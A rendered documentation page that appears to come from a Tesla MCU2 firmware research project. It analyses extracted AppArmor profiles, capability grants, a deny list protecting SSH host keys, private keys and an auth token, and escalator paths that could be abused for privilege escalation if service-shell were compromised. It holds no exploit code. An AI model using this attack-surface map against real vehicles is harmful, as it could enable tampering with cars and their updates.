13.1 High Priority </span> </a> </li> <li class=md-nav__item> <a href=#132-medium-priority class=md-nav__link> <span class=md-ellipsis> 13.2 Medium Priority </span> </a> </li> <li class=md-nav__item> <a href=#133-low-priority class=md-nav__link> <span class=md-ellipsis> 13.3 Low Priority </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#14-cross-references class=md-nav__link> <span class=md-ellipsis> 14. Cross-References </span> </a> </li> <li class=md-nav__item> <a href=#15-conclusion class=md-nav__link> <span class=md-ellipsis> 15. Conclusion </span> </a> </li> <li class=md-nav__item> <a href=#16-appendices class=md-nav__link> <span class=md-ellipsis> 16. Appendices </span> </a> <nav class=md-nav aria-label="16. Appendices"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#appendix-a-apparmor-profile-index class=md-nav__link> <span class=md-ellipsis> Appendix A: AppArmor Profile Index </span> </a> </li> <li class=md-nav__item> <a href=#appendix-b-sandboxd-var-files class=md-nav__link> <span class=md-ellipsis> Appendix B: Sandbox.d Var Files </span> </a> </li> <li class=md-nav__item> <a href=#appendix-c-kafel-seccomp-policies class=md-nav__link> <span class=md-ellipsis> Appendix C: Kafel Seccomp Policies </span> </a> </li> <li class=md-nav__item> <a href=#appendix-d-capability-reference class=md-nav__link> <span class=md-ellipsis> Appendix D: Capability Reference </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_6> <label class=md-nav__link for=__nav_6 id=__nav_6_label tabindex=0> <span class=md-ellipsis> Evidence & Audit </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_6_label aria-expanded=false> <label class=md-nav__title for=__nav_6> <span class="md-nav__icon md-icon"></span> Evidence & Audit </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../evidence/59-EVIDENCE-AUDIT/ class=md-nav__link> <span class=md-ellipsis> Evidence Audit </span> </a> </li> <li class=md-nav__item> <a href=../../VERIFICATION-STATUS/ class=md-nav__link> <span class=md-ellipsis> Verification Status </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_7> <label class=md-nav__link for=__nav_7 id=__nav_7_label tabindex=0> <span class=md-ellipsis> Tools & Scripts </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_7_label aria-expanded=false> <label class=md-nav__title for=__nav_7> <span class="md-nav__icon md-icon"></span> Tools & Scripts </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/56-gateway-factory-gate-REAL/ class=md-nav__link> <span class=md-ellipsis> Gateway Factory Gate </span> </a> </li> <li class=md-nav__item> <a href=../../SCRIPTS/ class=md-nav__link> <span class=md-ellipsis> Download Scripts </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1 id=apparmor-sandbox-security-analysis>AppArmor &amp; Sandbox Security Analysis</h1> <p><strong>Document:</strong> 31-apparmor-sandbox-security.md<br> <strong>Status:</strong> COMPLETE<br> <strong>Scope:</strong> Comprehensive AppArmor profile extraction, sandbox.bash analysis, capability grants, escape vectors, and security boundaries</p> <hr> <h2 id=executive-summary>Executive Summary</h2> <p>Tesla's MCU2 firmware implements <strong>defense-in-depth</strong> using: 1. <strong>AppArmor MAC (Mandatory Access Control)</strong> - 241 profile files, 215 compiled binaries 2. <strong>Minijail0 sandboxing</strong> - Chroot, namespace isolation, seccomp-bpf via Kafel 3. <strong>Cgroup resource limits</strong> - CPU, memory, network classification 4. <strong>Service-specific restrictions</strong> - 151 sandbox profile configurations</p> <p><strong>Critical Finding:</strong> The <code>escalator</code> binary provides <strong>controlled privilege escalation</strong> with 60+ scripts allowed to run <code>PUx</code> (unconfined transitions), creating a <strong>narrow but exploitable attack surface</strong> if service-shell can be compromised.</p> <hr> <h2 id=1-apparmor-profile-inventory>1. AppArmor Profile Inventory</h2> <h3 id=11-profile-statistics>1.1 Profile Statistics</h3> <div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1 href=#__codelineno-0-1></a><span class=c1># Total profile sources</span>
<a id=__codelineno-0-2 name=__codelineno-0-2 href=#__codelineno-0-2></a>/etc/apparmor.d/abstractions/:<span class=w> </span><span class=m>241</span><span class=w> </span>files
<a id=__codelineno-0-3 name=__codelineno-0-3 href=#__codelineno-0-3></a>/etc/apparmor.compiled/:<span class=w> </span><span class=m>215</span><span class=w> </span>compiled<span class=w> </span>binaries
<a id=__codelineno-0-4 name=__codelineno-0-4 href=#__codelineno-0-4></a>
<a id=__codelineno-0-5 name=__codelineno-0-5 href=#__codelineno-0-5></a><span class=c1># Key abstractions</span>
<a id=__codelineno-0-6 name=__codelineno-0-6 href=#__codelineno-0-6></a>-<span class=w> </span>service-shell<span class=w> </span><span class=o>(</span>base<span class=o>)</span>:<span class=w> </span>Network<span class=w> </span>restrictions,<span class=w> </span>file<span class=w> </span>boundaries
<a id=__codelineno-0-7 name=__codelineno-0-7 href=#__codelineno-0-7></a>-<span class=w> </span>service-shell-service-engineering:<span class=w> </span><span class=m>60</span>+<span class=w> </span>utility<span class=w> </span>profiles<span class=w> </span>with<span class=w> </span>capabilities
<a id=__codelineno-0-8 name=__codelineno-0-8 href=#__codelineno-0-8></a>-<span class=w> </span>service-shell-tcp-common:<span class=w> </span>Network<span class=w> </span>tools<span class=w> </span>with<span class=w> </span>CAP_NET_ADMIN
<a id=__codelineno-0-9 name=__codelineno-0-9 href=#__codelineno-0-9></a>-<span class=w> </span>escalator/*:<span class=w> </span>Privilege<span class=w> </span>escalation<span class=w> </span>paths<span class=w> </span><span class=o>(</span>exec,<span class=w> </span>rwfile,<span class=w> </span>cgroup,<span class=w> </span>sv,<span class=w> </span>base<span class=o>)</span>
</code></pre></div> <p><strong>Source:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/</code></p> <h3 id=12-compiled-profiles-sample>1.2 Compiled Profiles (Sample)</h3> <p>Critical binaries under AppArmor enforcement:</p> <table> <thead> <tr> <th>Binary</th> <th>Profile Path</th> <th>Purpose</th> </tr> </thead> <tbody> <tr> <td><code>updater-envoy</code></td> <td><code>usr.bin.updater-envoy</code></td> <td>Update orchestration proxy</td> </tr> <tr> <td><code>QtCar</code></td> <td><code>usr.tesla.UI.bin.QtCar</code></td> <td>Main UI process</td> </tr> <tr> <td><code>service-shell-macgyver</code></td> <td><code>usr.bin.service-shell-macgyver</code></td> <td>Service mode shell</td> </tr> <tr> <td><code>webcam</code></td> <td><code>usr.bin.webcam</code></td> <td>Camera access</td> </tr> <tr> <td><code>audiod</code></td> <td><code>usr.bin.audiod</code></td> <td>Audio daemon</td> </tr> <tr> <td><code>dnsmasq</code></td> <td><code>usr.sbin.dnsmasq</code></td> <td>DNS/DHCP server</td> </tr> </tbody> </table> <p><strong>Citation:</strong> <code>ls /firmware/mcu2-extracted/etc/apparmor.compiled/</code> (215 profiles)</p> <hr> <h2 id=2-service-shell-profile-analysis>2. Service-Shell Profile Analysis</h2> <h3 id=21-base-profile-service-shell>2.1 Base Profile: <code>service-shell</code></h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/service-shell</code></p> <p><strong>Key Restrictions:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1 href=#__codelineno-1-1></a># Network restrictions
<a id=__codelineno-1-2 name=__codelineno-1-2 href=#__codelineno-1-2></a>deny network inet6,                    # IPv6 blocked entirely
<a id=__codelineno-1-3 name=__codelineno-1-3 href=#__codelineno-1-3></a>network inet stream,                   # TCP allowed
<a id=__codelineno-1-4 name=__codelineno-1-4 href=#__codelineno-1-4></a>network inet dgram,                    # UDP allowed
<a id=__codelineno-1-5 name=__codelineno-1-5 href=#__codelineno-1-5></a>
<a id=__codelineno-1-6 name=__codelineno-1-6 href=#__codelineno-1-6></a># Capabilities
<a id=__codelineno-1-7 name=__codelineno-1-7 href=#__codelineno-1-7></a>capability chown,                      # Change file ownership
<a id=__codelineno-1-8 name=__codelineno-1-8 href=#__codelineno-1-8></a>capability dac_override,               # Bypass read/write/exec permissions
<a id=__codelineno-1-9 name=__codelineno-1-9 href=#__codelineno-1-9></a>capability dac_read_search,            # Bypass read/search permissions
<a id=__codelineno-1-10 name=__codelineno-1-10 href=#__codelineno-1-10></a>
<a id=__codelineno-1-11 name=__codelineno-1-11 href=#__codelineno-1-11></a># Allowed executors
<a id=__codelineno-1-12 name=__codelineno-1-12 href=#__codelineno-1-12></a>/usr/bin/service-shell-* Px,          # Confined transition to service-shell helpers
<a id=__codelineno-1-13 name=__codelineno-1-13 href=#__codelineno-1-13></a>signal (send) peer=/usr/bin/service-shell-*,
<a id=__codelineno-1-14 name=__codelineno-1-14 href=#__codelineno-1-14></a>
<a id=__codelineno-1-15 name=__codelineno-1-15 href=#__codelineno-1-15></a># Critical system access
<a id=__codelineno-1-16 name=__codelineno-1-16 href=#__codelineno-1-16></a>/sbin/runit-init Ux,                  # UNCONFINED - can restart init!
<a id=__codelineno-1-17 name=__codelineno-1-17 href=#__codelineno-1-17></a>/sbin/apparmor_parser Ux,             # UNCONFINED - can reload profiles!
<a id=__codelineno-1-18 name=__codelineno-1-18 href=#__codelineno-1-18></a>/sbin/vcert Ux,                       # UNCONFINED - certificate operations
<a id=__codelineno-1-19 name=__codelineno-1-19 href=#__codelineno-1-19></a>
<a id=__codelineno-1-20 name=__codelineno-1-20 href=#__codelineno-1-20></a># Hermes credentials (read-only)
<a id=__codelineno-1-21 name=__codelineno-1-21 href=#__codelineno-1-21></a>/var/lib/*_creds/*.{crt,key} r,
<a id=__codelineno-1-22 name=__codelineno-1-22 href=#__codelineno-1-22></a>/usr/share/tesla-certificates/{,**} r,
<a id=__codelineno-1-23 name=__codelineno-1-23 href=#__codelineno-1-23></a>
<a id=__codelineno-1-24 name=__codelineno-1-24 href=#__codelineno-1-24></a># Workspace
<a id=__codelineno-1-25 name=__codelineno-1-25 href=#__codelineno-1-25></a>/var/run/service-shell/{,**} rw,
<a id=__codelineno-1-26 name=__codelineno-1-26 href=#__codelineno-1-26></a>/run/service-shell/{,**} rw,
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell</code> [Lines 1-45]</p> <p><strong>ðŸš¨ CRITICAL VULNERABILITIES:</strong></p> <ol> <li><strong><code>/sbin/runit-init Ux</code></strong> - Service-shell can execute init <strong>unconfined</strong>, allowing system-wide service restarts</li> <li><strong><code>/sbin/apparmor_parser Ux</code></strong> - Can reload AppArmor profiles, potentially weakening enforcement</li> <li><strong><code>capability dac_override</code></strong> - Bypass filesystem permissions on any file</li> </ol> <hr> <h3 id=22-engineering-profile-service-shell-service-engineering>2.2 Engineering Profile: <code>service-shell-service-engineering</code></h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/service-shell-service-engineering</code></p> <p><strong>Includes:</strong> <code>service-shell-tcp-common</code>, <code>service-shell-allowed-files</code></p> <p><strong>Allowed Commands (60+ utilities):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1 href=#__codelineno-2-1></a># Diagnostic tools with capabilities
<a id=__codelineno-2-2 name=__codelineno-2-2 href=#__codelineno-2-2></a>/bin/ps Cx,                           # Process inspection (CAP_SYS_PTRACE)
<a id=__codelineno-2-3 name=__codelineno-2-3 href=#__codelineno-2-3></a>/usr/bin/lsof Cx,                     # Open file listing (CAP_SYS_PTRACE)
<a id=__codelineno-2-4 name=__codelineno-2-4 href=#__codelineno-2-4></a>/usr/bin/lspci Cx,                    # PCI inspection (CAP_SYS_ADMIN)
<a id=__codelineno-2-5 name=__codelineno-2-5 href=#__codelineno-2-5></a>/usr/bin/cpupower Cx,                 # CPU governor control (CAP_SYS_RAWIO)
<a id=__codelineno-2-6 name=__codelineno-2-6 href=#__codelineno-2-6></a>/usr/sbin/nvme Cx,                    # NVMe admin commands (CAP_SYS_ADMIN)
<a id=__codelineno-2-7 name=__codelineno-2-7 href=#__codelineno-2-7></a>
<a id=__codelineno-2-8 name=__codelineno-2-8 href=#__codelineno-2-8></a># Network tools
<a id=__codelineno-2-9 name=__codelineno-2-9 href=#__codelineno-2-9></a>/usr/bin/curl Cx,                     # HTTP requests (confined network)
<a id=__codelineno-2-10 name=__codelineno-2-10 href=#__codelineno-2-10></a>/usr/bin/traceroute Px,               # Network diagnostics
<a id=__codelineno-2-11 name=__codelineno-2-11 href=#__codelineno-2-11></a>
<a id=__codelineno-2-12 name=__codelineno-2-12 href=#__codelineno-2-12></a># Update inspection
<a id=__codelineno-2-13 name=__codelineno-2-13 href=#__codelineno-2-13></a>/var/spool/{,**} r,                   # Read updater spool files
<a id=__codelineno-2-14 name=__codelineno-2-14 href=#__codelineno-2-14></a>
<a id=__codelineno-2-15 name=__codelineno-2-15 href=#__codelineno-2-15></a># System modification
<a id=__codelineno-2-16 name=__codelineno-2-16 href=#__codelineno-2-16></a>/bin/rm Cx,                           # Delete files with special rules
<a id=__codelineno-2-17 name=__codelineno-2-17 href=#__codelineno-2-17></a>/sbin/reboot Cx,                      # System restart
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-service-engineering</code> [Lines 1-65]</p> <p><strong>Sub-Profiles with Dangerous Capabilities:</strong></p> <h4 id=binps-process-inspection><code>/bin/ps</code> - Process Inspection</h4> <p><div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1 href=#__codelineno-3-1></a>capability dac_read_search,
<a id=__codelineno-3-2 name=__codelineno-3-2 href=#__codelineno-3-2></a>capability dac_override,
<a id=__codelineno-3-3 name=__codelineno-3-3 href=#__codelineno-3-3></a>capability sys_ptrace,
<a id=__codelineno-3-4 name=__codelineno-3-4 href=#__codelineno-3-4></a>ptrace (read),
</code></pre></div> <strong>Risk:</strong> Can inspect all processes, including root-owned services</p> <h4 id=usrsbinnvme-nvme-admin><code>/usr/sbin/nvme</code> - NVMe Admin</h4> <p><div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1 href=#__codelineno-4-1></a>capability sys_admin,
<a id=__codelineno-4-2 name=__codelineno-4-2 href=#__codelineno-4-2></a>/dev/nvme* r,
<a id=__codelineno-4-3 name=__codelineno-4-3 href=#__codelineno-4-3></a>/sys/devices/**/nvme/{,**} r,
</code></pre></div> <strong>Risk:</strong> Direct storage hardware access</p> <h4 id=binrm-file-deletion><code>/bin/rm</code> - File Deletion</h4> <p><div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1 href=#__codelineno-5-1></a>capability dac_override,
<a id=__codelineno-5-2 name=__codelineno-5-2 href=#__codelineno-5-2></a>capability fowner,
<a id=__codelineno-5-3 name=__codelineno-5-3 href=#__codelineno-5-3></a>/home/*-updater/{,**} w,              # Can delete updater files!
<a id=__codelineno-5-4 name=__codelineno-5-4 href=#__codelineno-5-4></a>/var/spool/*-updater/{,**} rw,        # Can corrupt update queue
<a id=__codelineno-5-5 name=__codelineno-5-5 href=#__codelineno-5-5></a>/opt/games/usr/** rw,                 # Gaming partition access
</code></pre></div> <strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-service-engineering</code> [Lines 162-200]</p> <p><strong>ðŸš¨ CRITICAL:</strong> Service-shell can <strong>delete updater spool files</strong> via <code>rm</code>, potentially corrupting OTA updates in progress.</p> <hr> <h3 id=23-tcp-common-profile-service-shell-tcp-common>2.3 TCP Common Profile: <code>service-shell-tcp-common</code></h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/service-shell-tcp-common</code></p> <p><strong>Network Capabilities:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a>profile /sbin/ip flags=(attach_disconnected) {
<a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a>    capability net_admin,             # Full network administration!
<a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>    network netlink raw,              # Netlink protocol access
<a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>    /var/run/netns/{,**} r,          # Network namespace inspection
<a id=__codelineno-6-5 name=__codelineno-6-5 href=#__codelineno-6-5></a>}
<a id=__codelineno-6-6 name=__codelineno-6-6 href=#__codelineno-6-6></a>
<a id=__codelineno-6-7 name=__codelineno-6-7 href=#__codelineno-6-7></a>profile /bin/ping flags=(attach_disconnected) {
<a id=__codelineno-6-8 name=__codelineno-6-8 href=#__codelineno-6-8></a>    network inet icmp,
<a id=__codelineno-6-9 name=__codelineno-6-9 href=#__codelineno-6-9></a>    capability net_raw,               # Raw socket creation
<a id=__codelineno-6-10 name=__codelineno-6-10 href=#__codelineno-6-10></a>}
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-tcp-common</code> [Lines 68-85]</p> <p><strong>ðŸš¨ CRITICAL:</strong> <code>CAP_NET_ADMIN</code> allows: - Network interface manipulation - Firewall rule modification (<code>iptables</code>) - Route table changes - Network namespace creation/destruction</p> <hr> <h3 id=24-allowed-files>2.4 Allowed Files</h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/service-shell-allowed-files</code></p> <p><strong>Read Access:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a>/ r,                                  # Root directory listing
<a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>/bin/{,**} r,                         # All binaries
<a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>/etc/{,**} r,                         # All configuration files
<a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>/home/{,**/} r,                       # Home directory traversal
<a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a>/var/{,**/} r,                        # Var directory access
<a id=__codelineno-7-6 name=__codelineno-7-6 href=#__codelineno-7-6></a>@{PROC}/{,**} r,                      # Full /proc access
<a id=__codelineno-7-7 name=__codelineno-7-7 href=#__codelineno-7-7></a>/sys/{,**} r,                         # Full /sys access
<a id=__codelineno-7-8 name=__codelineno-7-8 href=#__codelineno-7-8></a>
<a id=__codelineno-7-9 name=__codelineno-7-9 href=#__codelineno-7-9></a># Specific files
<a id=__codelineno-7-10 name=__codelineno-7-10 href=#__codelineno-7-10></a>/home/tesla/.Tesla/data/*.json r,     # User data
<a id=__codelineno-7-11 name=__codelineno-7-11 href=#__codelineno-7-11></a>/var/lib/ofono/modem r,               # Modem status
<a id=__codelineno-7-12 name=__codelineno-7-12 href=#__codelineno-7-12></a>
<a id=__codelineno-7-13 name=__codelineno-7-13 href=#__codelineno-7-13></a># Scratch directory
<a id=__codelineno-7-14 name=__codelineno-7-14 href=#__codelineno-7-14></a>/ss/{,**} rw,                         # Unrestricted temp workspace
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-allowed-files</code> [Lines 1-44]</p> <hr> <h3 id=25-blocked-files>2.5 Blocked Files</h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/service-shell-blocked-files</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a># Blocked files
<a id=__codelineno-8-2 name=__codelineno-8-2 href=#__codelineno-8-2></a>audit deny @{PROC}/*/mem rw,                      # Process memory
<a id=__codelineno-8-3 name=__codelineno-8-3 href=#__codelineno-8-3></a>audit deny /var/etc/.pseudonym rw,                # Vehicle pseudonym
<a id=__codelineno-8-4 name=__codelineno-8-4 href=#__codelineno-8-4></a>audit deny /var/etc/ssh/ssh_host_*_key rw,        # SSH host keys
<a id=__codelineno-8-5 name=__codelineno-8-5 href=#__codelineno-8-5></a>audit deny /var/etc/random-seed rw,               # Entropy source
<a id=__codelineno-8-6 name=__codelineno-8-6 href=#__codelineno-8-6></a>audit deny /var/lib/*_creds/*.key rw,             # Private keys (read-only ok)
<a id=__codelineno-8-7 name=__codelineno-8-7 href=#__codelineno-8-7></a>audit deny /home/tesla-wmpf/AuthToken rw,         # WMPF auth token
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/service-shell-blocked-files</code></p> <p><strong>Note:</strong> Certificates (<code>.crt</code>) are <strong>readable</strong>, only <code>.key</code> files are write-protected.</p> <hr> <h2 id=3-escalator-binary-analysis>3. Escalator Binary Analysis</h2> <h3 id=31-overview>3.1 Overview</h3> <p><strong>Binary:</strong> <code>/usr/bin/escalator</code><br> <strong>Type:</strong> ELF 64-bit LSB pie executable, dynamically linked<br> <strong>Libraries:</strong> <code>libapparmor.so.1</code> </p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a>$<span class=w> </span>file<span class=w> </span>/usr/bin/escalator
<a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a>ELF<span class=w> </span><span class=m>64</span>-bit<span class=w> </span>LSB<span class=w> </span>pie<span class=w> </span>executable,<span class=w> </span>x86-64,<span class=w> </span>version<span class=w> </span><span class=m>1</span><span class=w> </span><span class=o>(</span>SYSV<span class=o>)</span>,<span class=w> </span>dynamically<span class=w> </span>linked
<a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a>interpreter<span class=w> </span>/lib64/ld-linux-x86-64.so.2,<span class=w> </span><span class=k>for</span><span class=w> </span>GNU/Linux<span class=w> </span><span class=m>5</span>.4.255,<span class=w> </span>stripped
</code></pre></div> <p><strong>Citation:</strong> <code>file /firmware/mcu2-extracted/usr/bin/escalator</code></p> <p><strong>Purpose:</strong> Controlled privilege escalation for service-shell commands.</p> <h3 id=32-escalator-profiles>3.2 Escalator Profiles</h3> <p><strong>Base Profile:</strong> <code>/etc/apparmor.d/abstractions/escalator/base</code></p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a>#include &lt;abstractions/tesla/minidump&gt;
<a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>
<a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a># Allow reading this binary&#39;s state
<a id=__codelineno-10-4 name=__codelineno-10-4 href=#__codelineno-10-4></a>ptrace (read) peer=/usr/bin/escalator,
<a id=__codelineno-10-5 name=__codelineno-10-5 href=#__codelineno-10-5></a>ptrace (read) peer=/usr/bin/escalator//**,
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/escalator/base</code></p> <hr> <h3 id=33-escalator-exec-profile-unconfined-transitions>3.3 Escalator Exec Profile - Unconfined Transitions</h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/escalator/exec</code></p> <p><strong>Dangerous Unconfined Transitions (PUx):</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a># System control
<a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>/sbin/reboot PUx,                                 # Unconfined reboot
<a id=__codelineno-11-3 name=__codelineno-11-3 href=#__codelineno-11-3></a>/usr/sbin/urgent-reboot.sh PUx,                   # Emergency reboot
<a id=__codelineno-11-4 name=__codelineno-11-4 href=#__codelineno-11-4></a>/sbin/clean-disk PUx,                             # Disk cleanup
<a id=__codelineno-11-5 name=__codelineno-11-5 href=#__codelineno-11-5></a>/sbin/migrate.sh PUx,                             # Migration scripts
<a id=__codelineno-11-6 name=__codelineno-11-6 href=#__codelineno-11-6></a>/sbin/ssh-disconnect-users PUx,                   # SSH control
<a id=__codelineno-11-7 name=__codelineno-11-7 href=#__codelineno-11-7></a>
<a id=__codelineno-11-8 name=__codelineno-11-8 href=#__codelineno-11-8></a># Sandbox profile operations
<a id=__codelineno-11-9 name=__codelineno-11-9 href=#__codelineno-11-9></a>/etc/sandbox/sandbox-profile-data-migrate.bash PUx,
<a id=__codelineno-11-10 name=__codelineno-11-10 href=#__codelineno-11-10></a>/etc/sandbox/sandbox-profile-data-prune.bash PUx,
<a id=__codelineno-11-11 name=__codelineno-11-11 href=#__codelineno-11-11></a>
<a id=__codelineno-11-12 name=__codelineno-11-12 href=#__codelineno-11-12></a># Hardware control
<a id=__codelineno-11-13 name=__codelineno-11-13 href=#__codelineno-11-13></a>/usr/sbin/i2cset PUx,                             # I2C bus writes
<a id=__codelineno-11-14 name=__codelineno-11-14 href=#__codelineno-11-14></a>/usr/sbin/gw-diag PUx,                            # Gateway diagnostics
<a id=__codelineno-11-15 name=__codelineno-11-15 href=#__codelineno-11-15></a>/usr/sbin/vcrypt PUx,                             # Cryptographic operations
<a id=__codelineno-11-16 name=__codelineno-11-16 href=#__codelineno-11-16></a>/usr/sbin/arm-ecall PUx,                          # eCall modem
<a id=__codelineno-11-17 name=__codelineno-11-17 href=#__codelineno-11-17></a>/usr/sbin/tesla-telit-update PUx,                 # Modem firmware
<a id=__codelineno-11-18 name=__codelineno-11-18 href=#__codelineno-11-18></a>/usr/sbin/dgpu-hot-{add,remove} PUx,              # GPU hotplug
<a id=__codelineno-11-19 name=__codelineno-11-19 href=#__codelineno-11-19></a>
<a id=__codelineno-11-20 name=__codelineno-11-20 href=#__codelineno-11-20></a># Firmware updates
<a id=__codelineno-11-21 name=__codelineno-11-21 href=#__codelineno-11-21></a>/deploy/ice-fpt-update PUx,                       # ICE processor update
<a id=__codelineno-11-22 name=__codelineno-11-22 href=#__codelineno-11-22></a>/usr/local/bin/iris-fw-upgrade.sh PUx,            # Camera firmware
<a id=__codelineno-11-23 name=__codelineno-11-23 href=#__codelineno-11-23></a>
<a id=__codelineno-11-24 name=__codelineno-11-24 href=#__codelineno-11-24></a># Network tools
<a id=__codelineno-11-25 name=__codelineno-11-25 href=#__codelineno-11-25></a>/bin/pkill PUx,                                   # Unconfined process kill
<a id=__codelineno-11-26 name=__codelineno-11-26 href=#__codelineno-11-26></a>/bin/ping PUx,                                    # Unconfined ping
<a id=__codelineno-11-27 name=__codelineno-11-27 href=#__codelineno-11-27></a>
<a id=__codelineno-11-28 name=__codelineno-11-28 href=#__codelineno-11-28></a># Hermes (telemetry)
<a id=__codelineno-11-29 name=__codelineno-11-29 href=#__codelineno-11-29></a>/opt/hermes/hermes_fileupload PUx,                # Log upload
<a id=__codelineno-11-30 name=__codelineno-11-30 href=#__codelineno-11-30></a>
<a id=__codelineno-11-31 name=__codelineno-11-31 href=#__codelineno-11-31></a># Audio/video
<a id=__codelineno-11-32 name=__codelineno-11-32 href=#__codelineno-11-32></a>/usr/sbin/audio-stack PUx,                        # Audio reconfiguration
<a id=__codelineno-11-33 name=__codelineno-11-33 href=#__codelineno-11-33></a>/usr/bin/backup-camera-setup PUx,                 # Camera setup
<a id=__codelineno-11-34 name=__codelineno-11-34 href=#__codelineno-11-34></a>
<a id=__codelineno-11-35 name=__codelineno-11-35 href=#__codelineno-11-35></a># Games/webapps
<a id=__codelineno-11-36 name=__codelineno-11-36 href=#__codelineno-11-36></a>/usr/bin/steamctl PUx,                            # Steam client control
<a id=__codelineno-11-37 name=__codelineno-11-37 href=#__codelineno-11-37></a>/usr/bin/odin-trigger-trampoline PUx,             # Odin Python framework
<a id=__codelineno-11-38 name=__codelineno-11-38 href=#__codelineno-11-38></a>
<a id=__codelineno-11-39 name=__codelineno-11-39 href=#__codelineno-11-39></a># System utilities
<a id=__codelineno-11-40 name=__codelineno-11-40 href=#__codelineno-11-40></a>/usr/bin/format-usb PUx,                          # USB formatting
<a id=__codelineno-11-41 name=__codelineno-11-41 href=#__codelineno-11-41></a>/usr/bin/clear-chromium-data PUx,                 # Browser data wipe
<a id=__codelineno-11-42 name=__codelineno-11-42 href=#__codelineno-11-42></a>/usr/local/bin/crashlogrotate PUx,                # Log rotation
<a id=__codelineno-11-43 name=__codelineno-11-43 href=#__codelineno-11-43></a>/usr/local/bin/restart-updater PUx,               # Updater restart
<a id=__codelineno-11-44 name=__codelineno-11-44 href=#__codelineno-11-44></a>/usr/local/bin/reboot-gateway PUx,                # Gateway reboot
</code></pre></div> <p><strong>Citation:</strong> <code>/firmware/mcu2-extracted/etc/apparmor.d/abstractions/escalator/exec</code> [Lines 27-100]</p> <p><strong>ðŸš¨ CRITICAL:</strong> 60+ scripts can run <strong>unconfined</strong> (PUx) via escalator. If service-shell is compromised, attacker can: 1. Execute arbitrary Python via <code>odin-trigger-trampoline</code> 2. Reboot gateway via <code>reboot-gateway</code> 3. Modify I2C hardware via <code>i2cset</code> 4. Upload arbitrary files via <code>hermes_fileupload</code> 5. Format USB drives to destroy evidence via <code>format-usb</code></p> <hr> <h3 id=34-escalator-rwfile-profile>3.4 Escalator RWFile Profile</h3> <p><strong>Path:</strong> <code>/etc/apparmor.d/abstractions/escalator/rwfile</code></p> <p><strong>Writable Files:</strong></p> <div class=highlight><pre><span></span><code><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a>capability dac_override,                          # Bypass file permissions
<a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a>
<a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a>/bin/rm rix,                                      # File deletion
